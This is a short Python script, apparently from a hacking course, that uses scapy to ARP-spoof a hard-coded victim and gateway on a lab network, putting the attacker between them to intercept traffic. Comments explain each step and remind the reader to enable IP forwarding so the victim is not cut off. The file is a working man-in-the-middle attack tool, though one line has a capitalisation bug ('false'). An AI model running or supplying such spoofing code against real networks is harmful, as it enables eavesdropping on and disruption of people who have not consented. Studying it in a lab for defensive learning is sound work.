#!/usr/bin/env python

import scapy.all as scapy
import time
import sys

# scapy.ls(scapy.ARP()) # shows scapy options for packet creation

# Get target mac
def get_mac(ip):
	arp_request = scapy.ARP(pdst=ip) # see network scanner for notes
	broadcast = scapy.Ether(dst='ff:ff:ff:ff:ff:ff') 
	arp_request_broadcast = broadcast/arp_request # Combines broadcast and arp_requet packet using Scapy
	answered_list = scapy.srp(arp_request_broadcast, timeout=1)[0]
	mac = answered_list[0][1].hwsrc # Gets the mac address

	return mac

# Arp spoof - Both Target and Gateway
def spoof(target_ip, spoof_ip):
	# Target(victim) ip pdst
	# Gateway(router) ip psrc
	target_mac = get_mac(target_ip)
	packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
	# Tell the target computer that we are the Gateway router
	scapy.send(packet, verbose=false)

# Don't forget to run `echo 1 > /proc/sys/net/ipv4/ip_forward` in a separate terminal window to enable ip forwarding. Otherwise you DoS the target machine
packet_count = 0
while True:
	spoof("10.0.2.7", "10.0.2.1")
	spoof("10.0.2.1", "10.0.2.7")
	packet_count = packet_count + 2
	print("\r[+] Packets sent: ", str(packet_count)), # Prints from beginning of line
	sys.stdout.flush() # Flush standard output and print whatevers in there immediately
	time.sleep(2)
